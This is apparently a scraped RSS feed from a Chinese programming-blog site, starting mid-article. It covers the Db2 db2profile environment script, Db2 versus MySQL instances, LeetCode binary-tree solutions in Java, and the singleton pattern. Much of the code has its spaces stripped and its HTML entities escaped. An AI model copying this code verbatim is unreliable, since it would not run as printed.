directoryPREV_DB2_PATH=`whichdb22&gt;/dev/null`if["X${PREV_DB2_PATH}"!="X"];thenPREV_BIN_PATH=`dirname${PREV_DB2_PATH}2&gt;/dev/null`if["X${PREV_BIN_PATH}"!="X"];thenCUR_INSTHOME=`dirname${PREV_BIN_PATH}`fifielseINST_DIR=${INSTHOME?}/sqllibfiDB2_NET_CLIENT_PATH：如果已设置此变量，使用该路径作为实例目录；否则，使用默认的INSTHOME/sqllib。5.设置 Db2 环境变量CUR_INSTHOME=${CUR_INSTHOME:=""}IBM_DB_DIR=${INST_DIR?}IBM_DB_LIB=${INST_DIR?}/libIBM_DB_INCLUDE=${INST_DIR?}/includeDB2_HOME=${INST_DIR?}DB2LIB=${INST_DIR?}/libIBM_DB_HOME=${INST_DIR?}exportIBM_DB_DIRexportIBM_DB_LIBexportIBM_DB_HOMEexportIBM_DB_INCLUDEexportDB2_HOMEexportDB2LIB这部分代码设置与 Db2 相关的目录变量，确保后续 Db2 命令能够正确找到库文件、头文件等。6.函数定义：添加或移除路径AddRemoveString(){if[$#-ne3];thenreturn0fivar=$1#The enviornment variable to be processedaddrm_str=$2#The new path to be usedaction=$3#Action: a -&gt; add, r -&gt; removeif["X${action?}"!="Xa"-a"X${action?}"!="Xr"];thenreturn0# return without doing anythingfiawkval='$1!= "'${addrm_str?}'"{print$0}'newval=`evalecho\\${$var:-""}|awk'{for (i=1; i&lt;= NF; ++i) \if($i!= VAR &amp;&amp; length($i) &gt; 0 ) print$i":"}'FS=":"VAR=${addrm_str?}`newval=`echo${newval?}|sed's/\: /\:/g'`if["X${action?}"="Xa"];thennewval=${newval?}"${addrm_str?}"elsenewval=`echo${newval?}|sed's/:$//'`fieval$var=\"${newval?}\"unsetvar addrm_str awkval newval}AddRemoveString函数：用于添加或移除环境变量中的路径。该函数接收三个参数：要处理的环境变量、要添加或删除的路径、操作类型（添加或删除）。函数中使用awk和sed命令处理路径字符串，确保环境变量的正确性。7.清理旧实例的环境变量if[-n"${CUR_INSTNAME?}"];thenCUR_INSTHOME=`${INST_DIR}/bin/db2usrinf -d ${CUR_INSTNAME?}`CUR_INSTHOME="${CUR_INSTHOME}/sqllib"如果正在切换 Db2 实例，将清理旧实例的环境变量，以防止环境污染。8.DAS 环境的清理DASWORKDIR=${DASWORKDIR:=""}if["X${DASWORKDIR}"!="X"];thenAddRemoveStringPATH${DASWORKDIR?}/bin rAddRemoveStringPATH${DASWORKDIR?}/adm r...fi清理 Db2 Administration Server (DAS) 的环境变量。9.设置 Db2 命令和工具路径fortmp_pathinbin adm misc;doAddRemoveStringPATH${INST_DIR}/${tmp_path?}adone将 Db2 的可执行文件和工具路径添加到PATH环境变量中。10.JDBC 支持设置if[-f${INST_DIR}/java/db2java.zip];thenAddRemoveString CLASSPATH${INST_DIR}/java/db2java.zip afi设置 Java 数据库连接 (JDBC) 所需的类路径，确保 Java 应用程序能够使用 Db2。11.CLPPlus 支持设置if[-f${INST_DIR?}/tools/clpplus.jar];thenAddRemoveString CLASSPATH${INST_DIR?}/tools/clpplus.jar afi设置 CLPPlus 工具所需的类路径。12.用户自定义环境if[-f${INSTHOME?}/sqllib/userprofile];then.${INSTHOME?}/sqllib/userprofileelif[-f${INST_DIR}/userprofile];then.${INST_DIR}/userprofilefi该部分允许用户在userprofile文件中定义自定义环境变量，确保用户的配置在每次登录时生效。总结db2profile脚本是为 IBM Db2 数据库设置环境的关键文件。它确保 Db2 用户在运行命令时拥有正确的环境配置，包括必要的路径和变量。该文件的设计允许用户根据需要进行自定义，同时提供了简洁的函数和逻辑以管理环境变量。7. db2和mysql的区别（主要是db2的多实例）Db2 和 MySQL 都支持多个数据库的管理，但它们在实例和数据库的管理结构上有所不同。以下是对 Db2 中多个实例的作用和意义的详细解释：### 1. **实例的定义与作用**- **实例**：在 Db2 中，实例是数据库管理系统的一个完整的运行环境，每个实例可以独立管理其自己的数据库、用户、配置和资源。
- **作用**：- **隔离性**：每个 Db2 实例可以在不同的配置、版本和环境下独立运行。这种隔离使得不同的应用可以在相同的物理服务器上运行而不会互相干扰。例如，可以在一个实例中运行一个测试数据库，而在另一个实例中运行一个生产数据库。- **资源管理**：不同实例可以有不同的内存、CPU 和存储配置。这样，管理员可以根据需要对每个实例进行资源分配和管理。- **安全性**：通过使用不同的实例，可以为不同的应用设置不同的用户权限和访问控制。这样可以更好地保护数据和资源。### 2. **MySQL 中的数据库与实例的关系**- 在 MySQL 中，所有数据库都运行在同一个实例下，用户通过实例管理不同的数据库。这种结构使得管理相对简单，但在需要高度隔离和独立配置的场景下，可能会受到限制。
- **示例**：如果一个 MySQL 实例的配置需要更改，这将影响到所有的数据库，而在 Db2 中，一个实例的更改不会影响到其他实例。### 3. **使用场景**- **多租户环境**：在多租户环境中，可以为每个租户创建独立的实例，以确保数据隔离和资源管理。
- **版本管理**：可以在同一台服务器上运行不同版本的 Db2 实例，便于进行版本测试和迁移。
- **实验和开发**：开发和测试人员可以创建新的实例以实验不同的数据库配置，而不会影响到生产环境。### 4. **总结**虽然 Db2 和 MySQL 都能够处理多个数据库，但 Db2 通过实例的概念提供了更高的灵活性、隔离性和管理能力。这使得它更适合于复杂的企业环境和对安全、资源管理有更高要求的场景。http://www.ppmy.cn/news/1540896.html相关文章二叉树习题其二Java【力扣】【算法学习day.9】前言 
前言 书接上篇文章二叉树习题其一&amp;#xff0c;这篇文章我们将基础拓展 
###我做这类文档一个重要的目的还是给正在学习的大家提供方向&amp;#xff08;例如想要掌握基础用法&amp;#xff0c;该刷哪些题&amp;#xff1f;&amp;#xff09;我的解析也不会做的非常详细&amp;#xff0c;只会提供思…阅读更多...03 设计模式-创造型模式-单例模式单例模式&amp;#xff08;Singleton Pattern&amp;#xff09;是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式&amp;#xff0c;它提供了一种创建对象的最佳方式。 
这种模式涉及到一个单一的类&amp;#xff0c;该类负责创建自己的对象&amp;#xff0c;同时确保只有单个对象被创建…阅读更多...「漏洞复现」英飞达医学影像存档与通信系统 WebUserLogin.asmx 信息泄露漏洞0x01 免责声明 
请勿利用文章内的相关技术从事非法测试&amp;#xff0c;由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失&amp;#xff0c;均由使用者本人负责&amp;#xff0c;作者不为此承担任何责任。工具来自网络&amp;#xff0c;安全性自测&amp;#xff0c;如有侵权请联系删…阅读更多...Linux下压缩与解压缩命令大全【详解】&amp;#x1f468;‍&amp;#x1f393;博主简介 &amp;#x1f3c5;CSDN博客专家   &amp;#x1f3c5;云计算领域优质创作者   &amp;#x1f3c5;华为云开发者社区专家博主   &amp;#x1f3c5;阿里云开发者社区专家博主 &amp;#x1f48a;交流社区&amp;#xff1a;运维交流社区 欢迎大家的加入&amp;#xff01…阅读更多...二叉树算法之二叉树遍历（前序、中序、后序、层次遍历）二叉树遍历是指按照某种顺序访问二叉树的所有节点。常见的二叉树遍历方式包括前序遍历&amp;#xff08;Preorder Traversal&amp;#xff09;、中序遍历&amp;#xff08;Inorder Traversal&amp;#xff09;、后序遍历&amp;#xff08;Postorder Traversal&amp;#xff09;和层次遍历&amp;#xff08;Level-or…阅读更多...Vue前端预览docx文档Vue前端预览docx文档 
实现效果 vue代码 &lt;el-dialog title"预览" :visible.sync"filePreview"&gt;&lt;div ref"file"&gt;&lt;/div&gt;&lt;/el-dialog&gt;引入依赖文件 官方文档地址 https://www.npmjs.com/package/docx-preview?activeTabre…阅读更多...SpringCloud Gateway保姆级入门教程什么是微服务网关 SpringCloud Gateway是Spring全家桶中一个比较新的项目&amp;#xff0c;Spring社区是这么介绍它的&amp;#xff1a; 该项目借助Spring WebFlux的能力&amp;#xff0c;打造了一个API网关。旨在提供一种简单而有效的方法来作为API服务的路由&amp;#xff0c;并为它们提供各种增强…阅读更多...uniapp配置微信小程序分包（分包优化）1.manifest.json中 
源码视图中找到mp-weixin&amp;#xff0c;新增代码"optimization":{"subPackages":true}&amp;#xff0c;如下图所示 "optimization" : {"subPackages" : true
} 
2.pages.json中 
分包内静态文件示例 
"subPackages&amp;…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:11 +0000</pubDate>
    </item>
    <item>
      <title>二叉树习题其二Java【力扣】【算法学习day.9】</title>
      <link>https://www.ppmy.cn/news/1540895.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维二叉树习题其二Java【力扣】【算法学习day.9】news/2025/10/31 23:19:10/前言前言书接上篇文章二叉树习题其一，这篇文章我们将基础拓展###我做这类文档一个重要的目的还是给正在学习的大家提供方向（例如想要掌握基础用法，该刷哪些题？）我的解析也不会做的非常详细，只会提供思路和一些关键点，力扣上的大佬们的题解质量是非常非常高滴！！！习题1.完全二叉树的节点个数题目链接：222. 完全二叉树的节点个数 - 力扣（LeetCode）题面：基本分析：遍历二叉树，遍历的过程中维护一个变量用于统计节点个数代码：/*** Definition for a binary tree node.* public class TreeNode {*     int val;*     TreeNode left;*     TreeNode right;*     TreeNode() {}*     TreeNode(int val) { this.val = val; }*     TreeNode(int val, TreeNode left, TreeNode right) {*         this.val = val;*         this.left = left;*         this.right = right;*     }* }*/
class Solution {int count = 0;public int countNodes(TreeNode root) {if(root==null)return 0;recursion(root);return count;}public void recursion(TreeNode node){if(node==null)return;if(node!=null)count++;recursion(node.left);recursion(node.right);}
}2.平衡二叉树题目链接：110. 平衡二叉树 - 力扣（LeetCode）基本分析：判断是否是平衡二叉树就是判断每个‘根节点’的左右子树的高度差是否小于等于1，以此递归下去代码：/*** Definition for a binary tree node.* public class TreeNode {*     int val;*     TreeNode left;*     TreeNode right;*     TreeNode() {}*     TreeNode(int val) { this.val = val; }*     TreeNode(int val, TreeNode left, TreeNode right) {*         this.val = val;*         this.left = left;*         this.right = right;*     }* }*/
class Solution {public boolean isBalanced(TreeNode root) {return recursion(root)!=-1;}public int recursion(TreeNode node){if(node==null){return 0;}int left = recursion(node.left);if(left==-1){return -1;}int right = recursion(node.right);if(right==-1){return -1;}return Math.abs(left-right)&gt;=2?-1:Math.max(left,right)+1;}}3.二叉树的所有路径题目链接:257. 二叉树的所有路径 - 力扣（LeetCode）基本分析：同样是遍历二叉树，值得注意的是，拼接箭头最好在递归函数调用的时候，这样可以省去很多麻烦代码：/*** Definition for a binary tree node.* public class TreeNode {*     int val;*     TreeNode left;*     TreeNode right;*     TreeNode() {}*     TreeNode(int val) { this.val = val; }*     TreeNode(int val, TreeNode left, TreeNode right) {*         this.val = val;*         this.left = left;*         this.right = right;*     }* }*/
class Solution {List&lt;String&gt; list = new ArrayList&lt;&gt;();public List&lt;String&gt; binaryTreePaths(TreeNode root) {recursion(root,"");return list;}public void recursion(TreeNode node,String pre){pre+=node.val;if(node.left!=null) recursion(node.left,pre+"-&gt;");if(node.right!=null) recursion(node.right,pre+"-&gt;");if(node.left==null&amp;&amp;node.right==null){list.add(pre);return;}}
}4.左叶子之和题目链接:404. 左叶子之和 - 力扣（LeetCode）基本分析：递归函数多维护一个字符串，用于标记该节点是否为左节点，然后就是遍历到最后一个节点进行相加操作代码：/*** Definition for a binary tree node.* public class TreeNode {*     int val;*     TreeNode left;*     TreeNode right;*     TreeNode() {}*     TreeNode(int val) { this.val = val; }*     TreeNode(int val, TreeNode left, TreeNode right) {*         this.val = val;*         this.left = left;*         this.right = right;*     }* }*/
class Solution {int sum = 0;public int sumOfLeftLeaves(TreeNode root) {if(root==null||(root.left==null&amp;&amp;root.right==null))return 0;recursion(root.left,"left");recursion(root.right,"right");return sum;}public void recursion(TreeNode node,String flag){if(node==null){return;}if(node.left==null&amp;&amp;node.right==null&amp;&amp;flag.equals("left")){sum+=node.val;}if(node.left!=null){recursion(node.left,"left"); }if(node.right!=null){recursion(node.right,"right"); }}
}5.找树左下角的值题目链接:513. 找树左下角的值 - 力扣（LeetCode）题面：基本分析：这道题要求是找最底层最左边的元素，如果我们调用递归函数是先遍历左节点再遍历右节点，那么一定是先遍历到最底层的左节点，所以只需要判断是不是更低一层即可，然后更改值代码：/*** Definition for a binary tree node.* public class TreeNode {*     int val;*     TreeNode left;*     TreeNode right;*     TreeNode() {}*     TreeNode(int val) { this.val = val; }*     TreeNode(int val, TreeNode left, TreeNode right) {*         this.val = val;*         this.left = left;*         this.right = right;*     }* }*/
class Solution {int ans = 0;int count = Integer.MIN_VALUE;public int findBottomLeftValue(TreeNode root) {ans = root.val;recursion(root.left,2);recursion(root.right,2);return ans;}public void recursion(TreeNode node,int u){if(node==null)return;if(node.left==null&amp;&amp;node.right==null){if(u&gt;count){System.out.println(1);count = u;ans = node.val;}}recursion(node.left,u+1);recursion(node.right,u+1);     }
}6.路径总和题目链接:112. 路径总和 - 力扣（LeetCode）题面：基本分析：遍历，并维护一个值，用来记录到达底部时是否和目标值相同代码：/*** Definition for a binary tree node.* public class TreeNode {*     int val;*     TreeNode left;*     TreeNode right;*     TreeNode() {}*     TreeNode(int val) { this.val = val; }*     TreeNode(int val, TreeNode left, TreeNode right) {*         this.val = val;*         this.left = left;*         this.right = right;*     }* }*/
class Solution {int target =0;public boolean hasPathSum(TreeNode root, int targetSum) {if(root==null)return false;target = targetSum;return recursion(root,0);}public boolean recursion(TreeNode node,int sum){if(node==null)return false;sum+=node.val;if(node.left==null&amp;&amp;node.right==null){return sum==target;}boolean bool1 =  recursion(node.left,sum);boolean bool2 =  recursion(node.right,sum);return bool1||bool2;}
}后言上面是二叉树的部分习题，下一篇会讲解二叉树的其他相关力扣习题，希望有所帮助，一同进步，共勉！http://www.ppmy.cn/news/1540895.html相关文章03 设计模式-创造型模式-单例模式单例模式&amp;#xff08;Singleton Pattern&amp;#xff09;是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式&amp;#xff0c;它提供了一种创建对象的最佳方式。 
这种模式涉及到一个单一的类&amp;#xff0c;该类负责创建自己的对象&amp;#xff0c;同时确保只有单个对象被创建…阅读更多...「漏洞复现」英飞达医学影像存档与通信系统 WebUserLogin.asmx 信息泄露漏洞0x01 免责声明 
请勿利用文章内的相关技术从事非法测试&amp;#xff0c;由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失&amp;#xff0c;均由使用者本人负责&amp;#xff0c;作者不为此承担任何责任。工具来自网络&amp;#xff0c;安全性自测&amp;#xff0c;如有侵权请联系删…阅读更多...Linux下压缩与解压缩命令大全【详解】&amp;#x1f468;‍&amp;#x1f393;博主简介 &amp;#x1f3c5;CSDN博客专家   &amp;#x1f3c5;云计算领域优质创作者   &amp;#x1f3c5;华为云开发者社区专家博主   &amp;#x1f3c5;阿里云开发者社区专家博主 &amp;#x1f48a;交流社区&amp;#xff1a;运维交流社区 欢迎大家的加入&amp;#xff01…阅读更多...二叉树算法之二叉树遍历（前序、中序、后序、层次遍历）二叉树遍历是指按照某种顺序访问二叉树的所有节点。常见的二叉树遍历方式包括前序遍历&amp;#xff08;Preorder Traversal&amp;#xff09;、中序遍历&amp;#xff08;Inorder Traversal&amp;#xff09;、后序遍历&amp;#xff08;Postorder Traversal&amp;#xff09;和层次遍历&amp;#xff08;Level-or…阅读更多...Vue前端预览docx文档Vue前端预览docx文档 
实现效果 vue代码 &lt;el-dialog title"预览" :visible.sync"filePreview"&gt;&lt;div ref"file"&gt;&lt;/div&gt;&lt;/el-dialog&gt;引入依赖文件 官方文档地址 https://www.npmjs.com/package/docx-preview?activeTabre…阅读更多...SpringCloud Gateway保姆级入门教程什么是微服务网关 SpringCloud Gateway是Spring全家桶中一个比较新的项目&amp;#xff0c;Spring社区是这么介绍它的&amp;#xff1a; 该项目借助Spring WebFlux的能力&amp;#xff0c;打造了一个API网关。旨在提供一种简单而有效的方法来作为API服务的路由&amp;#xff0c;并为它们提供各种增强…阅读更多...uniapp配置微信小程序分包（分包优化）1.manifest.json中 
源码视图中找到mp-weixin&amp;#xff0c;新增代码"optimization":{"subPackages":true}&amp;#xff0c;如下图所示 "optimization" : {"subPackages" : true
} 
2.pages.json中 
分包内静态文件示例 
"subPackages&amp;…阅读更多...利用mydumper从MySQL迁移数据到OceanBase数据库命令记录一&amp;#xff1a;中转服务器环境准备 
1、下载安装包。 
请根据需要在 下载安装包 中&amp;#xff0c;下载对应的安装包并安装。 
2、在数据库主机上解压缩安装包。 
以 mydumper-0.12.7-2-zstd.el7.x86_64.rpm 为示例。 
rpm2cpio mydumper-0.12.7-2-zstd.el7.x86_64.rpm | cpio -di…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:10 +0000</pubDate>
    </item>
    <item>
      <title>03 设计模式-创造型模式-单例模式</title>
      <link>https://www.ppmy.cn/news/1540894.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维03 设计模式-创造型模式-单例模式news/2025/10/31 23:19:09/单例模式（Singleton Pattern）是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。单例模式是一种创建型设计模式，它确保一个类只有一个实例，并提供了一个全局访问点来访问该实例。注意：1、单例类只能有一个实例。2、单例类必须自己创建自己的唯一实例。3、单例类必须给所有其他对象提供这一实例。设计模式，最近持续更新中，如需要请关注如果你觉得我分享的内容或者我的努力对你有帮助，或者你只是想表达对我的支持和鼓励，请考虑给我点赞、评论、收藏。您的鼓励是我前进的动力，让我感到非常感激。文章目录1 概要2 实现3 Demo代码3.1 懒汉式，线程不安全3.2 懒汉式，线程安全3.3 饿汉式3.4 双检锁/双重校验锁（DCL，即 double-checked locking）3.5 登记式/静态内部类3.6 枚举4 开发案例1 概要意图确保一个类只有一个实例，并提供一个全局访问点来访问该实例。主要解决频繁创建和销毁全局使用的类实例的问题。何时使用当需要控制实例数目，节省系统资源时。如何解决检查系统是否已经存在该单例，如果存在则返回该实例；如果不存在则创建一个新实例。关键代码构造函数是私有的。应用实例一个班级只有一个班主任。Windows 在多进程多线程环境下操作文件时，避免多个进程或线程同时操作一个文件，需要通过唯一实例进行处理。设备管理器设计为单例模式，例如电脑有两台打印机，避免同时打印同一个文件。优点内存中只有一个实例，减少内存开销，尤其是频繁创建和销毁实例时（如管理学院首页页面缓存）。避免资源的多重占用（如写文件操作）。缺点没有接口，不能继承。与单一职责原则冲突，一个类应该只关心内部逻辑，而不关心实例化方式。使用场景生成唯一序列号。WEB 中的计数器，避免每次刷新都在数据库中增加计数，先缓存起来。创建消耗资源过多的对象，如 I/O 与数据库连接等。注意事项线程安全：getInstance() 方法中需要使用同步锁 synchronized (Singleton.class) 防止多线程同时进入造成实例被多次创建。延迟初始化：实例在第一次调用 getInstance() 方法时创建。序列化和反序列化：重写 readResolve 方法以确保反序列化时不会创建新的实例。反射攻击：在构造函数中添加防护代码，防止通过反射创建新实例。类加载器问题：注意复杂类加载环境可能导致的多个实例问题。结构单例模式包含以下几个主要角色：单例类：包含单例实例的类，通常将构造函数声明为私有。静态成员变量：用于存储单例实例的静态成员变量。获取实例方法：静态方法，用于获取单例实例。私有构造函数：防止外部直接实例化单例类。线程安全处理：确保在多线程环境下单例实例的创建是安全的。2 实现我们将创建一个 SingleObject 类。SingleObject 类有它的私有构造函数和本身的一个静态实例。SingleObject 类提供了一个静态方法，供外界获取它的静态实例。SingletonPatternDemo 类使用 SingleObject 类来获取 SingleObject 对象。创建一个 Singleton 类。publicclassSingleObject{//创建 SingleObject 的一个对象privatestaticSingleObjectinstance=newSingleObject();//让构造函数为 private，这样该类就不会被实例化privateSingleObject(){}//获取唯一可用的对象publicstaticSingleObjectgetInstance(){returninstance;}publicvoidshowMessage(){System.out.println("Hello World!");}}从 singleton 类获取唯一的对象。publicclassSingletonPatternDemo{publicstaticvoidmain(String[]args){//不合法的构造函数//编译时错误：构造函数 SingleObject() 是不可见的//SingleObject object = new SingleObject();//获取唯一可用的对象SingleObjectobject=SingleObject.getInstance();//显示消息object.showMessage();}}3 Demo代码3.1 懒汉式，线程不安全/*
1、懒汉式，线程不安全
是否 Lazy 初始化：是是否多线程安全：否实现难度：易描述：这种方式是最基本的实现方式，这种实现最大的问题就是不支持多线程。因为没有加锁 synchronized，所以严格意义上它并不算单例模式。
这种方式 lazy loading 很明显，不要求线程安全，在多线程不能正常工作。*/publicclassSingleton_1{privatestaticSingleton_1instance;privateSingleton_1(){}publicstaticSingleton_1getInstance(){if(instance==null){instance=newSingleton_1();}returninstance;}}接下来介绍的几种实现方式都支持多线程，但是在性能上有所差异。3.2 懒汉式，线程安全/*
2、懒汉式，线程安全
是否 Lazy 初始化：是是否多线程安全：是实现难度：易描述：这种方式具备很好的 lazy loading，能够在多线程中很好的工作，但是，效率很低，99% 情况下不需要同步。
优点：第一次调用才初始化，避免内存浪费。
缺点：必须加锁 synchronized 才能保证单例，但加锁会影响效率。
getInstance() 的性能对应用程序不是很关键（该方法使用不太频繁）。*/publicclassSingleton_2{privatestaticSingleton_2instance;privateSingleton_2(){}publicstaticsynchronizedSingleton_2getInstance(){if(instance==null){instance=newSingleton_2();}returninstance;}}3.3 饿汉式/*
3、饿汉式
是否 Lazy 初始化：否是否多线程安全：是实现难度：易描述：这种方式比较常用，但容易产生垃圾对象。
优点：没有加锁，执行效率会提高。
缺点：类加载时就初始化，浪费内存。
它基于 classloader 机制避免了多线程的同步问题，不过，instance 在类装载时就实例化，虽然导致类装载的原因有很多种，在单例模式中大多数都是调用 getInstance 方法， 但是也不能确定有其他的方式（或者其他的静态方法）导致类装载，这时候初始化 instance 显然没有达到 lazy loading 的效果。*/publicclassSingleton_3{privatestaticSingleton_3instance=newSingleton_3();privateSingleton_3(){}publicstaticSingleton_3getInstance(){returninstance;}}3.4 双检锁/双重校验锁（DCL，即 double-checked locking）/*
4、双检锁/双重校验锁（DCL，即 double-checked locking）
JDK 版本：JDK1.5 起是否 Lazy 初始化：是是否多线程安全：是实现难度：较复杂描述：这种方式采用双锁机制，安全且在多线程情况下能保持高性能。
getInstance() 的性能对应用程序很关键。*/publicclassSingleton_4{privatevolatilestaticSingleton_4singleton;privateSingleton_4(){}publicstaticSingleton_4getSingleton(){if(singleton==null){synchronized(Singleton_4.class){if(singleton==null){singleton=newSingleton_4();}}}returnsingleton;}}3.5 登记式/静态内部类/*
5、登记式/静态内部类
是否 Lazy 初始化：是是否多线程安全：是实现难度：一般描述：这种方式能达到双检锁方式一样的功效，但实现更简单。对静态域使用延迟初始化，应使用这种方式而不是双检锁方式。这种方式只适用于静态域的情况，双检锁方式可在实例域需要延迟初始化时使用。
这种方式同样利用了 classloader 机制来保证初始化 instance 时只有一个线程，它跟第 3 种方式不同的是：第 3 种方式只要 Singleton 类被装载了，那么 instance 就会被实例化（没有达到 lazy loading 效果），而这种方式是 Singleton 类被装载了，instance 不一定被初始化。因为 SingletonHolder 类没有被主动使用，只有通过显式调用 getInstance 方法时，才会显式装载 SingletonHolder 类，从而实例化 instance。想象一下，如果实例化 instance 很消耗资源，所以想让它延迟加载，另外一方面，又不希望在 Singleton 类加载时就实例化，因为不能确保 Singleton 类还可能在其他的地方被主动使用从而被加载，那么这个时候实例化 instance 显然是不合适的。这个时候，这种方式相比第 3 种方式就显得很合理。*/publicclassSingleton_5{privatestaticclassSingletonHolder{privatestaticfinalSingleton_5INSTANCE=newSingleton_5();}privateSingleton_5(){}publicstaticfinalSingleton_5getInstance(){returnSingletonHolder.INSTANCE;}}3.6 枚举/*
6、枚举
JDK 版本：JDK1.5 起是否 Lazy 初始化：否是否多线程安全：是实现难度：易描述：这种实现方式还没有被广泛采用，但这是实现单例模式的最佳方法。它更简洁，自动支持序列化机制，绝对防止多次实例化。
这种方式是 Effective Java 作者 Josh Bloch 提倡的方式，它不仅能避免多线程同步问题，而且还自动支持序列化机制，防止反序列化重新创建新的对象，绝对防止多次实例化。不过，由于 JDK1.5 之后才加入 enum 特性，用这种方式写不免让人感觉生疏，在实际工作中，也很少用。
不能通过 reflection attack 来调用私有构造方法。*/publicenumSingleton_6{INSTANCE;publicvoidwhateverMethod(){System.out.println("whateverMethod");}}4 开发案例算法执行服务创建hdfs连接，使用的单例模式，初始化一下publicclassHdfsConnection{privatestaticfinalLoggerLOGGER=LoggerFactory.getLogger(HdfsConnection.class);privatestaticHdfsConnectioninstance;/*** Gets instance.** @return the instance*/publicstaticsynchronizedHdfsConnectiongetInstance(StringinstallScenarios){if(instance!=null){returninstance;}returninstance=newHdfsConnection(installScenarios);}privateFileSystemfs;privateHdfsConnection(StringinstallScenarios){LOGGER.info("Init HDFS Connection start!");// 读取配置HdfsConfighdfsConfig=ReadHdfsConfig.getHdfsConfig(installScenarios);LOGGER.info("hdfsConfig: {} ",JSON.toJSONString(hdfsConfig));if(Objects.isNull(hdfsConfig)){LOGGER.error("HdfsConfig is null");thrownewCommonServiceException(AIModelError.HDFS_EXCEPTION);}// 设置配置Configurationconf=newConfiguration();LOGGER.info("conf: {} ",JSON.toJSONString(conf));UserGroupInformation.setConfiguration(conf);// 初始化文件系统连接try{UserGroupInformation.loginUserFromKeytab(hdfsConfig.getOssuser(),hdfsConfig.getOssuserKeytab());fs=FileSystem.get(conf);}catch(Exceptionexp){LOGGER.error("Init HDFS Connection failure!");thrownewCommonServiceException(AIModelError.HDFS_EXCEPTION,exp);}LOGGER.info("Init HDFS Connection Success!");}/*** Gets hadoop fs.** @return the hadoop fs*/publicFileSystemgetHadoopFs(){returnfs;}}使用publicbooleanupload(StringlocalFile,StringhdfsPath){try{mkParentDir(hdfsPath);FileSystemfs=HdfsConnection.getInstance(installScenarios).getHadoopFs();fs.copyFromLocalFile(newPath(localFile),newPath(hdfsPath));LOGGER.info("upload file success!");returntrue;}catch(Exceptionexp){LOGGER.error("upload file failure!");thrownewCommonServiceException(AIModelError.HDFS_EXCEPTION,exp);}}http://www.ppmy.cn/news/1540894.html相关文章「漏洞复现」英飞达医学影像存档与通信系统 WebUserLogin.asmx 信息泄露漏洞0x01 免责声明 
请勿利用文章内的相关技术从事非法测试&amp;#xff0c;由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失&amp;#xff0c;均由使用者本人负责&amp;#xff0c;作者不为此承担任何责任。工具来自网络&amp;#xff0c;安全性自测&amp;#xff0c;如有侵权请联系删…阅读更多...Linux下压缩与解压缩命令大全【详解】&amp;#x1f468;‍&amp;#x1f393;博主简介 &amp;#x1f3c5;CSDN博客专家   &amp;#x1f3c5;云计算领域优质创作者   &amp;#x1f3c5;华为云开发者社区专家博主   &amp;#x1f3c5;阿里云开发者社区专家博主 &amp;#x1f48a;交流社区&amp;#xff1a;运维交流社区 欢迎大家的加入&amp;#xff01…阅读更多...二叉树算法之二叉树遍历（前序、中序、后序、层次遍历）二叉树遍历是指按照某种顺序访问二叉树的所有节点。常见的二叉树遍历方式包括前序遍历&amp;#xff08;Preorder Traversal&amp;#xff09;、中序遍历&amp;#xff08;Inorder Traversal&amp;#xff09;、后序遍历&amp;#xff08;Postorder Traversal&amp;#xff09;和层次遍历&amp;#xff08;Level-or…阅读更多...Vue前端预览docx文档Vue前端预览docx文档 
